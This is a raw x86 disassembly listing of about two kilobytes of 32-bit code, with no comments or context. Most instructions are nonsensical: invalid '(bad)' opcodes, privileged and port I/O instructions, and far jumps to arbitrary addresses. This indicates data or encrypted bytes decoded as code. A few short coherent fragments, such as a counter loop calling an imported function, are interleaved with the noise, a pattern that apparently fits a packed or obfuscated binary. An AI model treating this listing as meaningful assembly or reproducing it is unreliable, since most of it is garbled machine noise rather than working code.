  40597e:	mov    ch,0x60
  405980:	dec    ecx
  405981:	test   eax,0x88720135
  405986:	pop    eax
  405987:	sub    cl,BYTE PTR [ecx+0x6bcc0a]
  40598d:	push   ecx
  40598e:	adc    cl,ah
  405990:	lock in al,0xe9
  405993:	push   ds
  405994:	sbb    eax,0x827453f2
  405999:	in     eax,dx
  40599a:	in     eax,0xa1
  40599c:	and    DWORD PTR [edx-0x7430cb67],esp
  4059a2:	adc    eax,0x944ca497
  4059a7:	or     BYTE PTR [ebp-0x1b],0x5
  4059ab:	mov    ebp,0x8a923537
  4059b0:	or     eax,0xbe3b25ea
  4059b5:	push   ebp
  4059b6:	mov    ch,BYTE PTR [edi-0x2a71b13c]
  4059bc:	icebp  
  4059bd:	shr    BYTE PTR ds:0x400405ac,cl
  4059c3:	xor    al,0x41
  4059c5:	cwde   
  4059c6:	push   ds
  4059c7:	shl    BYTE PTR [ecx],cl
  4059c9:	or     al,0x87
  4059cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4059cc:	add    BYTE PTR [eax],cl
  4059ce:	shl    DWORD PTR [ebp-0x1412332c],cl
  4059d4:	and    eax,0xd8c0bbc7
  4059d9:	popf   
  4059da:	mov    cl,0xcd
  4059dc:	cli    
  4059dd:	mov    edx,0x3b7a5128
  4059e2:	push   edi
  4059e3:	xor    DWORD PTR [esi-0x1e896c],edi
  4059e9:	cdq    
  4059ea:	jg     0x4059c2
  4059ec:	dec    esp
  4059ed:	xor    eax,ebp
  4059ef:	add    ecx,DWORD PTR [ebx-0x76]
  4059f2:	mov    al,0xa3
  4059f4:	popa   
  4059f5:	icebp  
  4059f6:	pop    esp
  4059f7:	add    DWORD PTR [ebp+0x344d26b3],esi
  4059fd:	jo     0x405a77
  4059ff:	pop    ebp
  405a00:	test   al,0x3b
  405a02:	and    al,BYTE PTR [ecx+0x6b]
  405a05:	mov    edi,0x9c562b9c
  405a0a:	fs xchg ecx,eax
  405a0c:	add    eax,0xd364c521
  405a11:	push   es
  405a12:	jae    0x405a4d
  405a14:	retf   0x769a
  405a17:	mov    ah,BYTE PTR [edx]
  405a19:	mov    edx,esi
  405a1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405a1c:	sti    
  405a1d:	xchg   esp,eax
  405a1e:	jb     0x405a77
  405a20:	(bad)  
  405a21:	xor    DWORD PTR [esi+0x22748f3d],ebx
  405a27:	out    dx,al
  405a28:	lock or al,0x80
  405a2b:	(bad)  
  405a2c:	push   ebx
  405a2d:	imul   edx,eax,0xffffffa6
  405a30:	push   esi
  405a31:	mov    edx,0x34fc45c7
  405a36:	test   DWORD PTR [eax+edi*8+0x365b1521],ebx
  405a3d:	inc    ebx
  405a3e:	add    BYTE PTR [ebx+0x158bfc45],cl
  405a44:	outs   dx,DWORD PTR ds:[esi]
  405a45:	aaa    
  405a46:	inc    ebx
  405a47:	add    BYTE PTR [ecx],dh
  405a49:	adc    eax,0x433643
  405a4e:	push   esi
  405a4f:	mov    DWORD PTR ds:0x433767,0x6ead
  405a59:	mov    esi,DWORD PTR [ebp-0x8]
  405a5c:	mov    edx,0x7510853
  405a61:	and    DWORD PTR ds:0x43363f,ebx
  405a67:	xor    eax,edx
  405a69:	and    DWORD PTR ds:0x43371b,0x0
  405a73:	mov    ecx,DWORD PTR ds:0x43371b
  405a79:	inc    ecx
  405a7a:	mov    DWORD PTR ds:0x43371b,ecx
  405a80:	cmp    DWORD PTR ds:0x43371b,0x20
  405a87:	jne    0x405a99
  405a8d:	push   DWORD PTR [ebp-0x1c]
  405a90:	push   DWORD PTR [ebp-0x24]
  405a93:	call   DWORD PTR ds:0x412258
  405a99:	cmp    DWORD PTR ds:0x43371b,0x15
  405aa0:	jb     0x405a73
  405aa6:	xor    ecx,ecx
  405aa8:	add    ecx,DWORD PTR ds:0x43367b
  405aae:	mov    ecx,DWORD PTR [ecx]
  405ab0:	sbb    DWORD PTR ds:0x433757,ecx
  405ab6:	xor    esi,edx
  405ab8:	mov    ecx,0x32729a
  405abd:	add    esi,ecx
  405abf:	jmp    0x405e93
  405ac4:	aam    0x49
  405ac6:	in     eax,0x76
  405ac8:	ins    DWORD PTR es:[edi],dx
  405ac9:	jb     0x405b1e
  405acb:	imul   ebx,DWORD PTR ds:0xa34d28f4,0x46042228
  405ad5:	xor    edi,DWORD PTR [esp+edi*2-0x4b]
  405ad9:	jns    0x405b57
  405adb:	jl     0x405adf
  405add:	xlat   BYTE PTR ds:[ebx]
  405ade:	and    BYTE PTR [eax],ah
  405ae0:	stc    
  405ae1:	and    al,0xad
  405ae3:	pop    es
  405ae4:	ins    BYTE PTR es:[edi],dx
  405ae5:	xor    BYTE PTR [ebp-0x41a0ecf],al
  405aeb:	or     eax,0x4534832
  405af0:	add    eax,0xe9aa0162
  405af5:	retf   0xe1e7
  405af8:	push   esi
  405af9:	push   ebp
  405afa:	cs sub al,al
  405afd:	dec    ebp
  405afe:	xor    DWORD PTR [ebx+0x41],edx
  405b01:	mov    BYTE PTR [edx],al
  405b03:	add    eax,0x136499c7
  405b08:	mov    edx,ecx
  405b0a:	outs   dx,DWORD PTR ds:[esi]
  405b0b:	lods   al,BYTE PTR ds:[esi]
  405b0c:	addr16 push ss
  405b0e:	push   edi
  405b0f:	dec    eax
  405b10:	cmp    DWORD PTR [eax],ebx
  405b12:	je     0x405b4d
  405b14:	fsubr  QWORD PTR [edx+0x1]
  405b17:	push   edi
  405b18:	inc    eax
  405b19:	iret   
  405b1a:	xchg   ecx,eax
  405b1b:	mov    dh,0x47
  405b1d:	or     ebx,DWORD PTR [ecx]
  405b1f:	aad    0xd1
  405b21:	adc    DWORD PTR [edi-0x7114a0c4],esp
  405b27:	add    BYTE PTR [ecx+0x5d],0x6b
  405b2b:	dec    edx
  405b2c:	mov    dl,0x24
  405b2e:	jnp    0x405b4d
  405b30:	retf   0x99a2
  405b33:	cmp    cl,bl
  405b35:	xor    al,0x91
  405b37:	push   eax
  405b38:	push   ecx
  405b39:	stc    
  405b3a:	out    0xbf,eax
  405b3c:	or     DWORD PTR [edx],edx
  405b3e:	outs   dx,DWORD PTR ds:[esi]
  405b3f:	sub    esp,edx
  405b41:	pop    ecx
  405b42:	jmp    0x1fbf:0xe34defea
  405b49:	pop    eax
  405b4a:	ins    DWORD PTR es:[edi],dx
  405b4b:	mov    al,0x77
  405b4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405b4e:	xor    ebp,0x6f
  405b51:	lds    ebp,FWORD PTR [ecx+0x3a]
  405b54:	data16 jno 0x405ae6
  405b57:	outs   dx,DWORD PTR ds:[esi]
  405b58:	adc    eax,0xb8260a94
  405b5d:	dec    eax
  405b5e:	adc    al,0xe8
  405b60:	test   eax,0x778453b0
  405b65:	les    edi,FWORD PTR [ecx+0x17963dc9]
  405b6b:	loope  0x405b09
  405b6d:	ins    DWORD PTR es:[edi],dx
  405b6e:	nop
  405b6f:	pop    edx
  405b70:	out    dx,eax
  405b71:	int    0x91
  405b73:	adc    esi,DWORD PTR [eax]
  405b75:	sbb    bl,BYTE PTR [eax-0x6a1f55f2]
  405b7b:	lods   eax,DWORD PTR ds:[esi]
  405b7c:	mov    ebp,0xfeed7f39
  405b81:	lds    ebp,FWORD PTR [edx+0x4d]
  405b84:	int3   
  405b85:	xchg   esp,eax
  405b86:	imul   edx,esp,0xffffffe4
  405b89:	xor    al,0x84
  405b8b:	clc    
  405b8c:	push   eax
  405b8d:	or     ah,bh
  405b8f:	pushf  
  405b90:	inc    eax
  405b91:	push   edi
  405b92:	fwait
  405b93:	xor    ch,BYTE PTR [edi]
  405b95:	in     al,dx
  405b96:	bound  ecx,QWORD PTR [esi-0x6177f626]
  405b9c:	xlat   BYTE PTR ds:[ebx]
  405b9d:	stc    
  405b9e:	lods   eax,DWORD PTR ds:[esi]
  405b9f:	sub    eax,0xdbcf8747
  405ba4:	and    BYTE PTR [edx],0xd0
  405ba7:	aad    0xf3
  405ba9:	ds xchg ebx,eax
  405bab:	mov    eax,esi
  405bad:	stos   BYTE PTR es:[edi],al
  405bae:	rol    DWORD PTR [edi+0x6523228c],0x89
  405bb5:	gs push esi
  405bb7:	js     0x405bdb
  405bb9:	repz adc edx,DWORD PTR [esi-0x7b]
  405bbd:	bound  edi,QWORD PTR [eax+0x74]
  405bc0:	loope  0x405c10
  405bc2:	(bad)  
  405bc3:	mov    ds:0xadd929f,eax
  405bc8:	dec    ebp
  405bc9:	es (bad) 
  405bcb:	sar    DWORD PTR [edx],1
  405bcd:	mov    esp,0x701c838a
  405bd2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405bd3:	push   cs
  405bd4:	les    esi,FWORD PTR [edx+0x16]
  405bd7:	addr16 adc bh,bh
  405bda:	shl    sp,0x5b
  405bde:	xchg   BYTE PTR [ebx-0x4d8948ec],bh
  405be4:	pop    ecx
  405be5:	outs   dx,BYTE PTR ds:[esi]
  405be6:	(bad)  
  405be7:	repz pop es
  405be9:	lods   al,BYTE PTR ds:[esi]
  405bea:	aad    0x4f
  405bec:	mov    bl,0xa3
  405bee:	(bad)  
  405bef:	push   eax
  405bf0:	popf   
  405bf1:	inc    ebp
  405bf2:	mov    dh,0x82
  405bf4:	xchg   esi,eax
  405bf5:	and    eax,0x1b9fd5d0
  405bfa:	adc    ch,BYTE PTR [edi+0x4b2f4936]
  405c00:	jae    0x405c3f
  405c02:	jb     0x405bd4
  405c04:	inc    edx
  405c05:	and    BYTE PTR [ecx+ecx*8],bh
  405c08:	hlt    
  405c09:	push   0xfb9947f7
  405c0e:	sub    DWORD PTR [ecx-0x45],ecx
  405c11:	add    eax,ecx
  405c13:	sbb    DWORD PTR [ebx],0xe045becf
  405c19:	and    DWORD PTR [ecx],eax
  405c1b:	jo     0x405bf2
  405c1d:	adc    eax,0x724a97a4
  405c22:	pop    ebx
  405c23:	dec    edi
  405c24:	arpl   WORD PTR [edi-0x49],si
  405c27:	popf   
  405c28:	or     BYTE PTR [esi],cl
  405c2a:	mov    ch,0xa7
  405c2c:	and    ecx,edi
  405c2e:	shr    BYTE PTR [edi+0x32],cl
  405c31:	mov    eax,0xbced779c
  405c36:	data16 mov dl,bl
  405c39:	sar    DWORD PTR [edi-0x7a2c185a],cl
  405c3f:	lahf   
  405c40:	aas    
  405c41:	scas   al,BYTE PTR es:[edi]
  405c42:	mov    esp,0xe1d9845
  405c47:	mov    BYTE PTR [esi-0x11b9a431],al
  405c4d:	retf   
  405c4e:	dec    eax
  405c4f:	mov    DWORD PTR [ebp+0x5808daa2],ebx
  405c55:	das    
  405c56:	das    
  405c57:	or     eax,0x901f373c
  405c5c:	imul   DWORD PTR [esp+ebp*8+0x27]
  405c60:	mov    ebp,0xf2acfc94
  405c65:	pop    ebx
  405c66:	xor    dl,bl
  405c68:	inc    edi
  405c69:	mov    ah,0x4e
  405c6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405c6c:	mov    cl,0x1d
  405c6e:	cdq    
  405c6f:	jg     0x405ce5
  405c71:	pop    esp
  405c72:	push   ecx
  405c73:	sbb    al,0x68
  405c75:	(bad)  
  405c76:	daa    
  405c77:	pusha  
  405c78:	mov    eax,ds:0xcfd8a51e
  405c7d:	and    al,0xd7
  405c7f:	loopne 0x405cd5
  405c81:	xor    eax,0x95f0be88
  405c86:	loope  0x405c3b
  405c88:	jle    0x405c3c
  405c8a:	cmp    eax,0xfdfde006
  405c8f:	int    0xab
  405c91:	jbe    0x405c7b
  405c93:	cwde   
  405c94:	jno    0x405d00
  405c96:	fldcw  WORD PTR [edx+0x64]
  405c99:	mov    esp,0x896774e
  405c9e:	jmp    0x8e4c:0x26f7b01b
  405ca5:	aaa    
  405ca6:	pusha  
  405ca7:	adc    eax,edx
  405ca9:	mov    ch,0xaf
  405cab:	lods   eax,DWORD PTR ds:[esi]
  405cac:	sub    BYTE PTR [ebp-0x476c2cb1],ch
  405cb2:	inc    esp
  405cb3:	mov    dl,BYTE PTR [ebx-0x5605f032]
  405cb9:	call   0xb16045ec
  405cbe:	add    bl,BYTE PTR [esi]
  405cc0:	lds    ebp,FWORD PTR [ecx-0x12]
  405cc3:	pop    eax
  405cc4:	pushf  
  405cc5:	xchg   DWORD PTR [edx+0x32a806df],edx
  405ccb:	ja     0x405d07
  405ccd:	pop    ecx
  405cce:	xchg   esi,eax
  405ccf:	in     al,0xdd
  405cd1:	mov    ch,0x9d
  405cd3:	push   edi
  405cd4:	add    esp,edi
  405cd6:	or     edi,DWORD PTR [ecx+0x53]
  405cd9:	loope  0x405cfa
  405cdb:	mov    cl,0x6
  405cdd:	mov    edx,0xefd20388
  405ce2:	jae    0x405c68
  405ce4:	rol    al,1
  405ce6:	dec    eax
  405ce7:	(bad)  
  405ce8:	mov    eax,ds:0x1b3c81f8
  405ced:	inc    ebx
  405cee:	and    esi,DWORD PTR [eax+0x51]
  405cf1:	add    ebx,DWORD PTR [edi+0x7ce0b012]
  405cf7:	nop
  405cf8:	(bad)  
  405cf9:	jmp    edx
  405cfb:	(bad)  
  405cfc:	jecxz  0x405c85
  405cfe:	(bad)  
  405cff:	dec    ecx
  405d00:	ins    DWORD PTR es:[edi],dx
  405d01:	and    al,0x4b
  405d03:	dec    ebx
  405d04:	jbe    0x405d5a
  405d06:	repz cmp ebp,edx
  405d09:	or     ebx,DWORD PTR ds:0xec73729c
  405d0f:	cdq    
  405d10:	stos   BYTE PTR es:[edi],al
  405d11:	popf   
  405d12:	xchg   ebp,ebp
  405d14:	pop    ss
  405d15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405d16:	aad    0x37
  405d18:	call   0x713c:0x6951f833
  405d1f:	lahf   
  405d20:	push   eax
  405d21:	pushf  
  405d22:	mov    edi,0x897538d0
  405d27:	imul   esi,DWORD PTR [ecx],0x606a8e27
  405d2d:	das    
  405d2e:	scas   eax,DWORD PTR es:[edi]
  405d2f:	xchg   ebx,eax
  405d30:	les    ebp,FWORD PTR [esi]
  405d32:	xchg   edi,eax
  405d33:	mov    edx,0x4a069fa9
  405d38:	ins    DWORD PTR es:[edi],dx
  405d39:	cmp    DWORD PTR [ecx+0x5d],edi
  405d3c:	jmp    0x405cdb
  405d3e:	cs ja  0x405d24
  405d41:	add    BYTE PTR [ecx+0xe],cl
  405d44:	jns    0x405d71
  405d46:	fnstsw WORD PTR [eax-0x64]
  405d49:	imul   esi,edx,0x26
  405d4c:	outs   dx,BYTE PTR ds:[esi]
  405d4d:	jb     0x405dc7
  405d4f:	dec    edx
  405d50:	jo     0x405d9b
  405d52:	cwde   
  405d53:	sub    eax,0x463705
  405d58:	aaa    
  405d59:	stos   BYTE PTR es:[edi],al
  405d5a:	sbb    eax,0x1f9e2062
  405d5f:	shl    edi,cl
  405d61:	daa    
  405d62:	or     BYTE PTR [edx],cl
  405d64:	dec    esi
  405d65:	and    bl,bh
  405d67:	icebp  
  405d68:	imul   ebx,DWORD PTR [ebx-0x1d],0x37599bb6
  405d6f:	inc    ebp
  405d70:	retf   
  405d71:	or     DWORD PTR ds:0x9c96add0,ebp
  405d77:	jp     0x405d15
  405d79:	out    dx,al
  405d7a:	mov    cl,0xb4
  405d7c:	ffree  st(2)
  405d7e:	(bad)  
  405d7f:	outs   dx,DWORD PTR ds:[esi]
  405d80:	test   eax,0x4d4b26d4
  405d85:	ss ret 
  405d87:	outs   dx,BYTE PTR ds:[esi]
  405d88:	mov    bl,0x4d
  405d8a:	shl    ah,1
  405d8c:	cmp    ch,ah
  405d8e:	lock (bad) 
  405d90:	retf   
  405d91:	retf   
  405d92:	adc    esp,edx
  405d94:	(bad)  
  405d95:	lods   al,BYTE PTR ds:[esi]
  405d96:	sub    esi,DWORD PTR [ebx+edx*8]
  405d99:	xor    ch,BYTE PTR [edx]
  405d9b:	push   cs
  405d9c:	ret    
  405d9d:	inc    esi
  405d9e:	xor    edx,DWORD PTR [esi]
  405da0:	push   ebx
  405da1:	ret    
  405da2:	dec    ecx
  405da3:	dec    eax
  405da4:	int3   
  405da5:	push   esp
  405da6:	and    eax,0x401047ec
  405dab:	ror    BYTE PTR [ebx],1
  405dad:	push   ss
  405dae:	mov    dh,0x19
  405db0:	(bad)  
  405db1:	sbb    al,0xc1
  405db3:	mov    ds:0x65277853,eax
  405db8:	mov    ebp,0xe8bd282b
  405dbd:	cmp    ch,BYTE PTR [esp+edx*8+0x58012869]
  405dc4:	lahf   
  405dc5:	push   ss
  405dc6:	xchg   ebp,edi
  405dc8:	push   ecx
  405dc9:	or     bl,BYTE PTR [edx]
  405dcb:	cld    
  405dcc:	das    
  405dcd:	and    BYTE PTR [edi+eax*4],dh
  405dd0:	mov    ebp,0xc567ffa9
  405dd5:	sahf   
  405dd6:	loopne 0x405e4d
  405dd8:	push   es
  405dd9:	loope  0x405dc1
  405ddb:	test   al,0x20
  405ddd:	mov    DWORD PTR ds:0xe39248fc,edi
  405de3:	out    dx,al
  405de4:	stc    
  405de5:	popa   
  405de6:	jg     0x405d94
  405de8:	ins    DWORD PTR es:[edi],dx
  405de9:	inc    ecx
  405dea:	ins    DWORD PTR es:[edi],dx
  405deb:	sub    BYTE PTR [esi+eiz*4-0x2a],0x5b
  405df0:	outs   dx,DWORD PTR ds:[esi]
  405df1:	enter  0x97c1,0x16
  405df5:	sbb    BYTE PTR [edx+0x6ad3a823],bh
  405dfb:	lods   eax,DWORD PTR ds:[esi]
  405dfc:	jecxz  0x405da5
  405dfe:	cs push 0x3c
  405e01:	dec    edi
  405e02:	mov    dh,0x1
  405e04:	out    dx,eax
  405e05:	dec    eax
  405e06:	scas   al,BYTE PTR es:[edi]
  405e07:	mov    ebx,0x8ea6c3aa
  405e0c:	or     BYTE PTR [esi],dh
  405e0e:	pop    ebp
  405e0f:	call   0xc3206267
  405e14:	icebp  
  405e15:	adc    ah,BYTE PTR [esi+0x18]
  405e18:	fldenv [edx+edi*4]
  405e1b:	out    dx,eax
  405e1c:	loopne 0x405e1e
  405e1e:	lahf   
  405e1f:	adc    bh,BYTE PTR [ebp-0x513cfd9d]
  405e25:	mov    ecx,0x21bb5c07
  405e2a:	or     ch,BYTE PTR [ebp-0x52c7e2ea]
  405e30:	xor    DWORD PTR [edx+0x3047399b],ecx
  405e36:	inc    esi
  405e37:	sti    
  405e38:	test   esp,0xbf3820dc
  405e3e:	dec    ebx
  405e3f:	and    eax,0x4f005baa
  405e44:	retf   0x801e
  405e47:	(bad)  
  405e48:	jae    0x405eaf
  405e4a:	jae    0x405e88
  405e4c:	jg     0x405deb
  405e4e:	inc    eax
  405e4f:	into   
  405e50:	pop    esi
  405e51:	cmc    
  405e52:	popa   
  405e53:	sbb    DWORD PTR [esi],esi
  405e55:	inc    eax
  405e56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405e57:	dec    ebx
  405e58:	pop    esp
  405e59:	mov    ch,0xcd
  405e5b:	in     eax,0x5d
  405e5d:	das    
  405e5e:	mov    al,ds:0xb50fdcc7
  405e63:	lock ret 
  405e65:	scas   al,BYTE PTR es:[edi]
  405e66:	xor    eax,0xc31e2d9c
  405e6b:	popf   
  405e6c:	pop    es
  405e6d:	bound  ecx,QWORD PTR [ebx+eiz*1+0x25]
  405e71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405e72:	adc    eax,0xe14aa419
  405e77:	mov    edi,0x2758e672
  405e7c:	icebp  
  405e7d:	dec    esi
  405e7e:	int    0xe2
  405e80:	add    ecx,DWORD PTR gs:[edx-0x5fc1e26e]
  405e87:	sub    al,0xbb
  405e89:	shl    DWORD PTR [edi+0x490b392d],cl
  405e8f:	aam    0xc0
  405e91:	sahf   
  405e92:	outs   dx,DWORD PTR ds:[esi]
  405e93:	add    eax,ecx
  405e95:	imul   eax,esi
  405e98:	mov    esi,DWORD PTR [ebp+0xc]
  405e9b:	cmp    esi,eax
  405e9d:	jne    0x405eb9
  405ea3:	mov    eax,DWORD PTR [ebp-0x4]
  405ea6:	mov    esi,DWORD PTR [ebp-0x8]
  405ea9:	xor    eax,edx
  405eab:	xor    esi,edx
  405ead:	add    eax,ecx
  405eaf:	add    esi,ecx
  405eb1:	imul   eax,esi
  405eb4:	jmp    0x4062c8
  405eb9:	mov    eax,DWORD PTR [ebp+0xc]
  405ebc:	mov    eax,DWORD PTR [eax+0x78]
  405ebf:	mov    DWORD PTR [ebp+0xc],eax
  405ec2:	mov    eax,DWORD PTR [ebp-0x4]
  405ec5:	jmp    0x406299
  405eca:	bound  edx,QWORD PTR [eax-0x1c8e3b49]
  405ed0:	jge    0x405e84
  405ed2:	pop    ecx
  405ed3:	jo     0x405ebe
  405ed5:	mov    esi,0x1b84be18
  405eda:	(bad)  
  405edb:	aas    
  405edc:	jl     0x405f5a
  405ede:	mov    ch,0x79
  405ee0:	jl     0x405f5e
  405ee2:	cmp    edi,DWORD PTR [ebx+0x29]
  405ee5:	xchg   ebp,eax
  405ee6:	outs   dx,BYTE PTR ds:[esi]
  405ee7:	mov    ebx,0x48ccb6bb
  405eec:	dec    edx
  405eed:	push   esp
  405eee:	xor    DWORD PTR ds:[esi+ebx*1+0x2915b416],0x28
  405ef7:	xor    WORD PTR [esi],bp
  405efa:	jnp    0x405f53
  405efc:	xor    al,0x8c
  405efe:	jo     0x405f3c
  405f00:	pop    eax
  405f01:	inc    ecx
  405f02:	xor    dl,bh
  405f04:	mov    ah,0x36
  405f06:	or     ch,bl
  405f08:	stos   DWORD PTR es:[edi],eax
  405f09:	retw   
  405f0b:	(bad)
  405f0e:	cmp    al,0x79
  405f10:	mov    edi,0xa1fc9c21
  405f16:	jbe    0x405f05
  405f18:	into   
  405f19:	lds    esp,FWORD PTR [ecx+0x6cc64fd2]
  405f1f:	add    DWORD PTR [ebx],edx
  405f21:	jg     0x405f69
  405f23:	push   ss
  405f24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405f25:	div    BYTE PTR [ecx+0x47]
  405f28:	lea    esp,[ebp+0xe]
  405f2b:	push   edi
  405f2c:	sub    al,0xee
  405f2e:	shr    dh,0xbc
  405f31:	xor    dh,BYTE PTR [ecx-0x360dfa0e]
  405f37:	shl    al,1
  405f39:	(bad)
  405f3c:	add    DWORD PTR [esi+0x46ceb9f1],eax
  405f42:	and    ah,BYTE PTR [edx]
  405f44:	ret    0x5596
  405f47:	es dec eax
  405f49:	cmp    eax,0x71fcb646
  405f4e:	pop    ebp
  405f4f:	xor    al,0x59
  405f51:	sub    ax,0x2c30
  405f55:	jge    0x405fb4
  405f57:	aam    0xcc
  405f59:	pop    ecx
  405f5a:	xchg   BYTE PTR cs:[eax-0x50],bl
  405f5e:	lahf   
  405f5f:	or     BYTE PTR ds:0x80ee8e74,0xda
  405f66:	fwait
  405f67:	es sti 
  405f69:	out    0x66,eax
  405f6b:	(bad)  
  405f6c:	mov    bh,0x57
  405f6e:	xor    al,0xca
  405f70:	inc    eax
  405f71:	push   ecx
  405f72:	pop    esi
  405f73:	inc    esp
  405f74:	cmp    al,0x59
  405f76:	jecxz  0x405f17
  405f78:	dec    ecx
  405f79:	jl     0x405fc5
  405f7b:	xchg   edx,eax
  405f7c:	popa   
  405f7d:	xor    al,0x57
  405f7f:	jne    0x405f4d
  405f81:	or     al,0x82
  405f83:	jno    0x405f3a
  405f85:	les    ecx,FWORD PTR [ecx+0x1f832e72]
  405f8b:	xchg   esi,eax
  405f8c:	adc    edi,edx
  405f8e:	in     al,dx
  405f8f:	jb     0x405f51
  405f91:	stos   DWORD PTR es:[edi],eax
  405f92:	push   bp
  405f94:	jne    0x405f99
  405f96:	mov    bl,0x78
  405f98:	cmp    esp,DWORD PTR [eax]
  405f9a:	sbb    eax,0xbcadc7f5
  405f9f:	out    0xba,eax
  405fa1:	jmp    0x405fa6
  405fa3:	jmp    0x2641:0xf80cb0db
  405faa:	lds    eax,FWORD PTR [edi]
  405fac:	or     bh,dh
  405fae:	in     al,0x8
  405fb0:	jmp    0x405f7e
  405fb2:	push   esp
  405fb3:	sbb    DWORD PTR [edx+0x24],eax
  405fb6:	jne    0x406025
  405fb8:	push   eax
  405fb9:	out    dx,al
  405fba:	imul   eax,DWORD PTR [ebp+0x1b],0xffffffdb
  405fbe:	pusha  
  405fbf:	(bad)  
  405fc1:	js     0x406015
  405fc3:	imul   esp,DWORD PTR [edx+0x78305a02],0xffffffcc
  405fca:	aas    
  405fcb:	xchg   esi,eax
  405fcc:	jo     0x405f53
  405fce:	test   al,0x4b
  405fd0:	ds push 0x5c0b74b7
  405fd6:	push   ebp
  405fd7:	sbb    al,0x1
  405fd9:	jg     0x405ff6
  405fdb:	xlat   BYTE PTR ds:[ebx]
  405fdc:	mov    dl,0x8e
  405fde:	fwait
  405fdf:	shr    BYTE PTR [edx],0xd6
  405fe2:	(bad)  
  405fe3:	fist   DWORD PTR [edi+0x52]
  405fe6:	call   0xa6b5:0xb7697b4c
  405fed:	and    al,BYTE PTR [esi]
  405fef:	mov    DWORD PTR [ecx+0x7a],eax
  405ff2:	push   eax
  405ff3:	sbb    al,0xe7
  405ff5:	and    edx,eax
  405ff7:	fsubr  QWORD PTR [edi+ecx*1-0x67]
  405ffb:	loope  0x406064
  405ffd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405ffe:	imul   ecx,DWORD PTR [eax-0x6cd1bd5f],0xffffffa3
  406005:	push   0x4f8daa5f
  40600a:	mov    dl,0xd9
  40600c:	icebp  
  40600d:	retf   
  40600e:	pop    ss
  40600f:	sbb    eax,0x6ccdbf54
  406014:	inc    esp
  406015:	lock cld 
  406017:	xchg   esi,eax
  406018:	cli    
  406019:	dec    ebx
  40601a:	push   ebx
  40601b:	data16 sar cl,1
  40601e:	test   esp,0xec23dcfc
  406024:	dec    edi
  406025:	dec    edi
  406026:	scas   al,BYTE PTR es:[edi]
  406027:	daa    
  406028:	iret   
  406029:	lea    esp,[ebx-0x2b]
  40602c:	pop    es
  40602d:	and    DWORD PTR [edi-0x77],eax
  406030:	adc    al,0x54
  406032:	xchg   edx,eax
  406033:	imul   ecx,DWORD PTR [edi+0x71dab293],0x696ba798
  40603d:	sbb    esp,DWORD PTR [edx+0x77]
  406040:	lock mov eax,ds:0xa1307de6
  406046:	aaa    
  406047:	stos   DWORD PTR es:[edi],eax
  406048:	popa   
  406049:	daa    
  40604a:	sahf   
  40604b:	mov    ecx,?
  40604d:	add    DWORD PTR [ebx-0x70d4c4d2],esp
  406053:	repnz imul esp,DWORD PTR [edi-0x14],0x7cf964b2
  40605b:	daa    
  40605c:	inc    ebp
  40605d:	pop    ebx
  40605e:	in     eax,0xf0
  406060:	cmp    DWORD PTR [ebx*1-0xf77077f],edi
  406067:	cmc    
  406068:	idiv   esp
  40606a:	mov    bh,0x51
  40606c:	into   
  40606d:	ss mov ebp,0xff6df36b
  406073:	push   0x52da4985
  406078:	inc    edx
  406079:	mov    edx,0xc2e1c53a
  40607e:	push   0xa
  406080:	mov    bl,0x85
  406082:	sti    
  406083:	in     al,0x1a
  406085:	mov    ds:0x7d5543cb,eax
  40608a:	test   eax,0x6b13e8c2
  40608f:	cdq    
  406090:	inc    ebx
  406091:	loopne 0x406076
  406093:	sbb    ebx,edx
  406095:	push   ds
  406096:	add    bh,BYTE PTR [esp+esi*4+0x4f]
  40609a:	push   ebp
  40609b:	pusha  
  40609c:	imul   ecx,DWORD PTR [edx-0x658c4317],0xffffffe9
  4060a3:	les    esi,FWORD PTR [ebx]
  4060a5:	mov    esp,0x81c85bdb
  4060aa:	(bad)  
  4060ab:	jno    0x406116
  4060ad:	cmp    eax,0x46a91ea3
  4060b2:	add    ah,BYTE PTR [ebx-0x2f6a6517]
  4060b8:	bound  ebx,QWORD PTR [edi]
  4060ba:	mov    WORD PTR [ebp+0x40],es
  4060bd:	rol    DWORD PTR ds:0x5c6e5fa3,0x72
  4060c4:	inc    esp
  4060c5:	pop    eax
  4060c6:	jns    0x40610e
  4060c8:	cmp    ah,BYTE PTR [ecx-0x1c]
  4060cb:	and    DWORD PTR [ecx-0x6f],0x2f4c1dab
  4060d2:	sbb    ch,BYTE PTR [ebx-0x152cf8f3]
  4060d8:	fsub   QWORD PTR [ecx-0x4b]
  4060db:	and    al,0x63
  4060dd:	pushf  
  4060de:	sub    DWORD PTR [esi-0x4b],ebp
  4060e1:	rcr    ch,0x1
  4060e4:	jo     0x406164
  4060e6:	jnp    0x4060dd
  4060e8:	icebp  
  4060e9:	ins    BYTE PTR es:[edi],dx
  4060ea:	sub    al,0x3a
  4060ec:	hlt    
  4060ed:	stos   DWORD PTR es:[edi],eax
  4060ee:	mov    edi,0xae13b1de
  4060f3:	(bad)  
  4060f5:	sbb    ecx,DWORD PTR [ecx+0x59edebfd]
  4060fb:	mov    eax,0xa9834be2
  406100:	retf   0xa6f3
  406103:	mov    al,ds:0xb9539007
  406108:	call   0x8e622dee
  40610d:	dec    ecx
  40610e:	sub    ch,BYTE PTR [ebx+0x643bab1e]
  406114:	mov    BYTE PTR ds:0x6325bd8d,bl
  40611a:	outs   dx,DWORD PTR ds:[esi]
  40611b:	push   es
  40611c:	mov    dh,0x31
  40611e:	loop   0x4060ca
  406120:	(bad)
  406123:	sub    eax,0xa1974fc1
  406128:	out    dx,al
  406129:	add    ebp,DWORD PTR [ebx]
  40612b:	mov    WORD PTR [esi],gs
  40612d:	jmp    0x7a6e9963
  406132:	(bad)  
  406133:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406134:	loop   0x40611f
  406136:	retf   0x16c
  406139:	mov    al,ds:0x5ad6a876
  40613e:	add    esp,esi
  406140:	lock and edx,DWORD PTR [ebx+0x5d]
  406144:	push   ebp
  406145:	mov    edx,0xd81411ef
  40614a:	dec    BYTE PTR [ebp+eiz*2+0x13]
